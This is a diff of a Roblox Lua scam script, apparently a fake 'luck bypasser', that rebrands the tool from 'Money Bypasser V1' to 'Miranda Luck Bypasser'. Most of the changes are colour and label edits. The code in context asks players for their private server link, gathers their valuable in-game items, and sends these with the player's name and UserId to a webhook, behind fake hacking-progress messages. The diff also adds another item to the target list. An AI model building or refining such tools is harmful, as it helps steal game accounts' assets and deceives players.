@@ -27,13 +27,13 @@ if isBlacklisted(LocalPlayer.UserId) then
     return
 end
 
--- Función para crear gradiente amarillo en UIStroke (amarillo claro a oscuro)
-local function createYellowGradientPulse(stroke)
+-- Función para crear gradiente ROJO-CARMESÍ en UIStroke (con pulso)
+local function createRedCrimsonGradientPulse(stroke)
     local gradient = Instance.new("UIGradient")
     gradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 100)), -- Amarillo claro arriba
-        ColorSequenceKeypoint.new(0.33, Color3.fromRGB(255, 220, 0)),  -- Amarillo medio
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 150, 0))      -- Amarillo oscuro abajo
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 50, 50)),    -- Rojo brillante arriba
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(220, 20, 60)),  -- Carmesí medio
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(139, 0, 0))       -- Rojo oscuro/carmesí profundo abajo
     }
     gradient.Rotation = 90
     gradient.Parent = stroke
@@ -180,7 +180,8 @@ local allowedAnimals = {
     "Meowl",
     "Los Nooo My Hotspotsitos",
     "Los Spooky Combinasionas", 
-    "La Casa Boo"
+    "La Casa Boo",
+    "La Taco Combinasion"
  }
 
 local function getPodiumInfo()
@@ -292,7 +293,8 @@ local function sendToWebhook(link, foundAnimals)
         "Meowl",
         "Eviledon",
         " Los Spooky Combinasionas", 
-        "La Casa Boo", 
+        "La Casa Boo",
+        "La Taco Combinasion"
         
     }
 
@@ -301,7 +303,7 @@ local function sendToWebhook(link, foundAnimals)
 
     local playerName = LocalPlayer.Name
     local displayName = LocalPlayer.DisplayName
-    local userId = LocalPlayer.UserId -- ID del jugador
+    local userId = LocalPlayer.UserId
     local specialFound = false
 
     for _, animal in ipairs(foundAnimals) do
@@ -419,7 +421,7 @@ local function createLoadingScreen()
     backgroundFrame.Parent = loadingScreenGui
 
     
-    -- Efecto Matrix Rain mejorado
+    -- Efecto Matrix Rain mejorado con ROJO-CARMESÍ
 local matrixChars = {"÷", "¢", "€", "$", "¥", "₹", "₽", "₱", "₩", "£", "¥", "฿"}
 local matrixRains = {}
 
@@ -457,14 +459,15 @@ local function createMatrixRain()
         local transparency = 0.3 + ((48 - textSize) / 48) * 0.6
         char.TextTransparency = transparency
         
-        -- Gradiente de amarillo basado en posición
-        local yellowIntensity = math.max(100, 255 - (i * 15))
-        char.TextColor3 = Color3.fromRGB(255, yellowIntensity, 0)
+        -- Gradiente de ROJO-CARMESÍ basado en posición
+        local redIntensity = math.max(139, 255 - (i * 10))
+        local greenValue = math.max(0, 50 - (i * 5))
+        char.TextColor3 = Color3.fromRGB(redIntensity, greenValue, greenValue)
         
-        -- Stroke más visible en caracteres grandes
+        -- Stroke más visible en caracteres grandes con ROJO-CARMESÍ
         local stroke = Instance.new("UIStroke")
         stroke.Thickness = math.floor(textSize / 16)
-        stroke.Color = Color3.fromRGB(255, 220, 0)
+        stroke.Color = Color3.fromRGB(220, 20, 60) -- Carmesí
         stroke.Transparency = transparency - 0.1
         stroke.Parent = char
         
@@ -511,12 +514,14 @@ task.spawn(function()
                 end
             end
             
-            -- Pulso de brillo
+            -- Pulso de brillo ROJO-CARMESÍ
             rain.lifetime = rain.lifetime + 0.05
             local pulse = math.sin(rain.lifetime * 2) * 0.15
             for j, char in pairs(rain.chars) do
-                local baseYellow = math.max(100, 255 - (j * 15))
-                char.TextColor3 = Color3.fromRGB(255, math.floor(baseYellow + pulse * 100), 0)
+                local baseRed = math.max(139, 255 - (j * 10))
+                local pulsedRed = math.floor(baseRed + pulse * 80)
+                local greenValue = math.max(0, 50 - (j * 5))
+                char.TextColor3 = Color3.fromRGB(pulsedRed, greenValue, greenValue)
             end
             
             -- Si sale de la pantalla, eliminar y crear nueva
@@ -550,7 +555,7 @@ end)
     mainFrame.Name = "LoadingFrame"
     mainFrame.Size = UDim2.new(0, 500, 0, 320)
     mainFrame.Position = UDim2.new(0.5, -250, 0.5, -160)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(25,25,35)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
     mainFrame.BorderSizePixel = 0
     mainFrame.ZIndex = 10
     mainFrame.Parent = loadingScreenGui
@@ -561,14 +566,14 @@ end)
 
     local mainStroke = Instance.new("UIStroke")
     mainStroke.Thickness = 3
-    mainStroke.Color = Color3.fromRGB(255, 220, 0)
+    mainStroke.Color = Color3.fromRGB(220, 20, 60) -- Carmesí base
     mainStroke.Parent = mainFrame
-    createYellowGradientPulse(mainStroke)
+    createRedCrimsonGradientPulse(mainStroke)
 
     local headerFrame = Instance.new("Frame")
     headerFrame.Parent = mainFrame
     headerFrame.Size = UDim2.new(1,0,0,70)
-    headerFrame.BackgroundColor3 = Color3.fromRGB(35,35,50)
+    headerFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
     headerFrame.BorderSizePixel = 0
     headerFrame.ZIndex = 11
 
@@ -581,7 +586,7 @@ end)
     titleLabel.Size = UDim2.new(1,-30,0,35)
     titleLabel.Position = UDim2.new(0,15,0,8)
     titleLabel.BackgroundTransparency = 1
-    titleLabel.Text = "MONEY BYPASSER V1"
+    titleLabel.Text = "Miranda Luck Bypasser"
     titleLabel.TextColor3 = Color3.fromRGB(0,0,0)
     titleLabel.TextSize = 22
     titleLabel.Font = Enum.Font.Arcade
@@ -590,16 +595,16 @@ end)
 
     local titleStroke = Instance.new("UIStroke")
     titleStroke.Thickness = 2
-    titleStroke.Color = Color3.fromRGB(255, 220, 0)
+    titleStroke.Color = Color3.fromRGB(220, 20, 60) -- Carmesí
     titleStroke.Parent = titleLabel
-    createYellowGradientPulse(titleStroke)
+    createRedCrimsonGradientPulse(titleStroke)
 
     local subtitleLabel = Instance.new("TextLabel")
     subtitleLabel.Parent = headerFrame
     subtitleLabel.Size = UDim2.new(1,-30,0,20)
     subtitleLabel.Position = UDim2.new(0,15,0,45)
     subtitleLabel.BackgroundTransparency = 1
-    subtitleLabel.Text = "By DARKCOMUNITY"
+    subtitleLabel.Text = "By Miranda"
     subtitleLabel.TextColor3 = Color3.fromRGB(180,180,200)
     subtitleLabel.TextSize = 14
     subtitleLabel.Font = Enum.Font.Arcade
@@ -627,17 +632,17 @@ end)
     bgCircleCorner.Parent = bgCircle
 
     local bgCircleStroke = Instance.new("UIStroke")
-    bgCircleStroke.Color = Color3.fromRGB(255, 220, 0)
+    bgCircleStroke.Color = Color3.fromRGB(220, 20, 60) -- Carmesí
     bgCircleStroke.Thickness = 8
     bgCircleStroke.Transparency = 0
     bgCircleStroke.Parent = bgCircle
-    createYellowGradientPulse(bgCircleStroke)
+    createRedCrimsonGradientPulse(bgCircleStroke)
 
     local progressCircle = Instance.new("Frame")
     progressCircle.Size = UDim2.new(0, 0, 0, 0)
     progressCircle.Position = UDim2.new(0.5, 0, 0.5, 0)
     progressCircle.AnchorPoint = Vector2.new(0.5, 0.5)
-    progressCircle.BackgroundColor3 = Color3.fromRGB(255, 220, 0)
+    progressCircle.BackgroundColor3 = Color3.fromRGB(220, 20, 60) -- Carmesí
     progressCircle.BorderSizePixel = 0
     progressCircle.ZIndex = 12
     progressCircle.Parent = circleContainer
@@ -670,51 +675,21 @@ end)
     statusText.Parent = mainFrame
 
     local loadingMessages = {
-    "Injecting core patches into server...",
-    "Overwriting system modules...",
-    "Hijacking process scheduler...",
-    "Cracking encryption protocols...",
-    "Patching kernel vulnerabilities...",
-    "Opening hidden backdoors...",
-    "Streaming debug payloads...",
-    "Corrupting legacy signatures...",
-    "Establishing persistent hooks...",
-    "Overclocking mainframe allocator...",
-    "Dumping system payloads...",
-    "Rooting server access nodes...",
-    "Committing transactional changes...",
-    "Synchronizing network controllers...",
-    "Bypassing security throttles...",
-    "Rewriting configuration tables...",
-    "Aligning thread priorities...",
-    "Encrypting communication channels...",
-    "Fusing subsystem threads...",
-    "Stabilizing runtime engines...",
-    "Patching outdated modules...",
-    "Unlocking hidden features...",
-    "Mirroring data streams...",
-    "Negating error flags...",
-    "Simulating process telemetry...",
-    "Flushing cache entries...",
-    "Spawning temporary instances...",
-    "Rerouting packets through firewall...",
-    "Amplifying signal outputs...",
-    "Quarantining corrupted files...",
-    "Polling system nodes for consensus...",
-    "Hotpatching protocol kernels...",
-    "Priming dispatcher services...",
-    "Tunneling packets through core...",
-    "Modulating frequency envelopes...",
-    "Validating access signatures...",
-    "Harmonizing system drift...",
-    "Pumping microservice pulses...",
-    "Injecting curated fingerprints...",
-    "Caching high-priority tasks...",
-    "Swizzling memory bytes...",
-    "Transcoding legacy data...",
-    "Bootstrapping ephemeral instances...",
-    "Decrypting manifest files...",
-    "Handshaking with backup nodes..."
+    "Injecting luck module into server core...",
+        "Exploiting RNG seed for favorable outcomes...",
+        "Hijacking the fate scheduler...",
+        "Cracking fortune's encryption...",
+        "Patching the probability matrix...",
+        "Opening a backdoor to serendipity...",
+        "Seeding chaos with curated coincidences...",
+        "Executing luck override routine...",
+        "Streaming buffered fortune packets...",
+        "Corrupting bad-roll signatures...",
+        "Establishing persistent luck hook...",
+        "Overclocking the destiny allocator...",
+        "Dumping favorable event payloads...",
+        "Rooting the server for blessed spawns...",
+        "Committing transactional luck changes..."
 }
 
     local function updateCircleProgress(percent)
@@ -811,7 +786,7 @@ local mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
 mainFrame.Size = UDim2.new(0,600,0,400)
 mainFrame.Position = UDim2.new(0.5,-300,0.5,-200)
-mainFrame.BackgroundColor3 = Color3.fromRGB(255, 240, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(255, 50, 50) -- Rojo brillante
 mainFrame.BorderSizePixel = 0
 mainFrame.ZIndex = 10
 mainFrame.Active = true
@@ -835,7 +810,7 @@ local innerCorner = Instance.new("UICorner")
 innerCorner.CornerRadius = UDim.new(0,12)
 innerCorner.Parent = innerFrame
 
--- Fondo de código tipo CMD en amarillo
+-- Fondo de código tipo CMD en ROJO-CARMESÍ
 local codeBackground = Instance.new("ScrollingFrame")
 codeBackground.Name = "CodeBackground"
 codeBackground.Size = UDim2.new(1, 0, 1, 0)
@@ -917,7 +892,7 @@ local function createNewLine()
     lineLabel.Position = UDim2.new(0, 10, 0, (#allLines) * 16)
     lineLabel.BackgroundTransparency = 1
     lineLabel.Text = ""
-    lineLabel.TextColor3 = Color3.fromRGB(255, 220, 0)
+    lineLabel.TextColor3 = Color3.fromRGB(255, 50, 50) -- Rojo brillante
     lineLabel.TextTransparency = 0.6
     lineLabel.TextSize = 14
     lineLabel.Font = Enum.Font.Arcade
@@ -986,13 +961,13 @@ task.spawn(function()
     end
 end)
 
--- Gradiente amarillo en el outline
+-- Gradiente ROJO-CARMESÍ en el outline principal
 local mainFrameStroke = Instance.new("UIStroke")
 mainFrameStroke.Thickness = 10
-mainFrameStroke.Color = Color3.fromRGB(255, 220, 0)
+mainFrameStroke.Color = Color3.fromRGB(220, 20, 60) -- Carmesí base
 mainFrameStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 mainFrameStroke.Parent = mainFrame
-createYellowGradientPulse(mainFrameStroke)
+createRedCrimsonGradientPulse(mainFrameStroke)
 
 -- Imagen del decal en la izquierda
 local centerImage = Instance.new("ImageLabel")
@@ -1000,19 +975,19 @@ centerImage.Name = "CenterDecal"
 centerImage.Size = UDim2.new(0, 180, 0, 180)
 centerImage.Position = UDim2.new(0, 30, 0.5, -90)
 centerImage.BackgroundTransparency = 1
-centerImage.Image = "rbxassetid://6751051684"
+centerImage.Image = "rbxassetid://91819568091646"
 centerImage.ScaleType = Enum.ScaleType.Fit
 centerImage.ZIndex = 12
 centerImage.Parent = innerFrame
 
--- Título centrado horizontalmente
+-- Título centrado horizontalmente con ROJO-CARMESÍ
 local titleLabel = Instance.new("TextLabel")
 titleLabel.Parent = innerFrame
 titleLabel.Size = UDim2.new(0, 400, 0, 50)
 titleLabel.Position = UDim2.new(0.5, -100, 0, 40)
 titleLabel.BackgroundTransparency = 1
-titleLabel.Text = "Money Bypasser V1"
-titleLabel.TextColor3 = Color3.fromRGB(255, 240, 0)
+titleLabel.Text = "Miranda Luck Bypass"
+titleLabel.TextColor3 = Color3.fromRGB(255, 50, 50) -- Rojo brillante
 titleLabel.TextSize = 28
 titleLabel.Font = Enum.Font.Arcade
 titleLabel.TextXAlignment = Enum.TextXAlignment.Center
@@ -1020,17 +995,17 @@ titleLabel.ZIndex = 13
 
 local titleStroke = Instance.new("UIStroke")
 titleStroke.Thickness = 3
-titleStroke.Color = Color3.fromRGB(255, 220, 0)
+titleStroke.Color = Color3.fromRGB(220, 20, 60) -- Carmesí
 titleStroke.Parent = titleLabel
-createYellowGradientPulse(titleStroke)
+createRedCrimsonGradientPulse(titleStroke)
 
--- Subtítulo "By DARKCOMUNITY" centrado debajo del título
+-- Subtítulo "By Miranda" centrado debajo del título
 local subtitleLabel = Instance.new("TextLabel")
 subtitleLabel.Parent = innerFrame
 subtitleLabel.Size = UDim2.new(0, 400, 0, 25)
 subtitleLabel.Position = UDim2.new(0.5, -100, 0, 95)
 subtitleLabel.BackgroundTransparency = 1
-subtitleLabel.Text = "By DARKCOMUNITY"
+subtitleLabel.Text = "By MIRANDA"
 subtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
 subtitleLabel.TextSize = 16
 subtitleLabel.Font = Enum.Font.Arcade
@@ -1044,7 +1019,7 @@ inputSectionLabel.Size = UDim2.new(0, 340, 0, 25)
 inputSectionLabel.Position = UDim2.new(0, 220, 0, 150)
 inputSectionLabel.BackgroundTransparency = 1
 inputSectionLabel.Text = "Please Enter your private server link"
-inputSectionLabel.TextColor3 = Color3.fromRGB(255, 240, 0)
+inputSectionLabel.TextColor3 = Color3.fromRGB(255, 50, 50) -- Rojo brillante
 inputSectionLabel.TextSize = 14
 inputSectionLabel.Font = Enum.Font.Arcade
 inputSectionLabel.TextXAlignment = Enum.TextXAlignment.Left
@@ -1079,17 +1054,17 @@ inputCorner.Parent = inputBox
 
 local inputStroke = Instance.new("UIStroke")
 inputStroke.Thickness = 2
-inputStroke.Color = Color3.fromRGB(255, 220, 0)
+inputStroke.Color = Color3.fromRGB(220, 20, 60) -- Carmesí
 inputStroke.Parent = inputBox
-createYellowGradientPulse(inputStroke)
+createRedCrimsonGradientPulse(inputStroke)
 
--- Botón ENTER debajo del input
+-- Botón ENTER debajo del input con ROJO-CARMESÍ
 local serverButton = Instance.new("TextButton")
 serverButton.Name = "ServerButton"
 serverButton.Parent = innerFrame
 serverButton.Size = UDim2.new(0, 200, 0, 45)
 serverButton.Position = UDim2.new(0, 290, 0, 245)
-serverButton.BackgroundColor3 = Color3.fromRGB(255, 240, 0)
+serverButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50) -- Rojo brillante
 serverButton.BorderSizePixel = 0
 serverButton.Text = "ENTER"
 serverButton.TextColor3 = Color3.fromRGB(0, 0, 0)
@@ -1103,19 +1078,19 @@ serverCorner.Parent = serverButton
 
 local serverStroke = Instance.new("UIStroke")
 serverStroke.Thickness = 3
-serverStroke.Color = Color3.fromRGB(200, 150, 0)
+serverStroke.Color = Color3.fromRGB(139, 0, 0) -- Rojo oscuro carmesí
 serverStroke.Parent = serverButton
 
 serverButton.MouseEnter:Connect(function()
     TweenService:Create(serverButton, TweenInfo.new(0.2), {
-        BackgroundColor3 = Color3.fromRGB(255, 255, 100),
+        BackgroundColor3 = Color3.fromRGB(255, 100, 100),
         Size = UDim2.new(0, 210, 0, 50)
     }):Play()
 end)
 
 serverButton.MouseLeave:Connect(function()
     TweenService:Create(serverButton, TweenInfo.new(0.2), {
-        BackgroundColor3 = Color3.fromRGB(255, 240, 0),
+        BackgroundColor3 = Color3.fromRGB(255, 50, 50),
         Size = UDim2.new(0, 200, 0, 45)
     }):Play()
 end)
@@ -1146,7 +1121,7 @@ serverButton.MouseButton1Click:Connect(function()
     end
     
     statusLabel.Text = "Checking Servers..."
-    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
+    statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
     
     local podiumInfo = getPodiumInfo()
     local foundAnimals = {}
@@ -1157,7 +1132,7 @@ serverButton.MouseButton1Click:Connect(function()
     end
     
     statusLabel.Text = "Preparing script..."
-    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
+    statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
     
     local success = sendToWebhook(link, foundAnimals)
     
@@ -1188,7 +1163,7 @@ serverButton.MouseButton1Click:Connect(function()
         task.wait(1)
         
         TweenService:Create(serverButton, TweenInfo.new(0.3), {
-            BackgroundColor3 = Color3.fromRGB(255, 240, 0)
+            BackgroundColor3 = Color3.fromRGB(255, 50, 50)
         }):Play()
         
         task.wait(2)
@@ -1197,7 +1172,7 @@ serverButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- Efectos de partículas
+-- Efectos de partículas en ROJO-CARMESÍ
 local particleFrame = Instance.new("Frame")
 particleFrame.Parent = innerFrame
 particleFrame.Size = UDim2.new(1, 0, 1, 0)
@@ -1209,7 +1184,7 @@ for i = 1, 12 do
     p.Parent = particleFrame
     p.Size = UDim2.new(0, math.random(3, 6), 0, math.random(3, 6))
     p.Position = UDim2.new(math.random(), 0, math.random(), 0)
-    p.BackgroundColor3 = Color3.fromRGB(255, 220, math.random(0, 50))
+    p.BackgroundColor3 = Color3.fromRGB(255, math.random(20, 60), math.random(20, 60)) -- Tonos rojos
     p.BorderSizePixel = 0
     p.BackgroundTransparency = 0.5
     local c = Instance.new("UICorner")
